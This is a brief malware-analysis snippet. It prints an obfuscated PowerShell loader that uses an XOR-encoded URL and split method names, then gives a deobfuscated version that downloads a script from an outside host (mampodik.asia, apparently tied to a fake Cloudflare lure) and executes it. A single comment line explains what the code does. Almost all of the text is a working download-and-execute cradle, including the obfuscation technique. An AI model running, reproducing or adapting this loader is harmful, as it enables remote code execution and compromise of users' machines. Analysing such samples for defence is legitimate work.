$wp1=-join(@(87,75,75,79,76,5,16,16,82,94,82,79,80,91,86,84,17,94,76,86,94,16,94,79,86,16,86,81,91,90,71,17,79,87,79,0,94,2,76,92,25,75,80,84,90,81,2,7,92,94,94,89,6,10,12,91,7,6,11,8,7,93,7,94,8,14,6,14,90,93,12,13,13,6,10,92,14,14,8,94,12,14,15,93,10,12,94,92,6,15,10,6,91,11,94,91,9,6,94,14,90,12,6,8,90,92,12,93,13,91,11,25,77,73,2,13,9,6,14,9,10,14,15,89,8,11,10,7,90,9,92,13,9,94,10,90,91,9,90,9,11,13,11,92,9,92,15,25,76,77,92,2,94,77,92,80,17,80,77,88,17,86,83,25,82,80,91,90,2,92,83,80,74,91,89,83,94,77,90)|%{[char]($_ -bxor63)});
$pb4='Down'+'loadString';
$kezmq=New-Object ('Ne'+'t.WebClient');
[ScriptBlock]::Create($kezmq.$pb4($wp1)).Invoke()


# deobcfuscation:

$url = "https://mampodik.asia/api/index.php?a=sc&token=8caaf953d89478b8a7191eb32295c117a310b53ac9059d4ad69a1e397ec3b2d4&rv=26916510f7458e6c26a5ed6e6424c6c0&src=arco.org.il&mode=cloudflare";
$action = 'DownloadString';
$operation = New-Object('Net.WebClient');
[ScriptBlock]::Create($operation.$action($url)).Invoke()

#So it downloads the file in the URL and runs it in Powershell.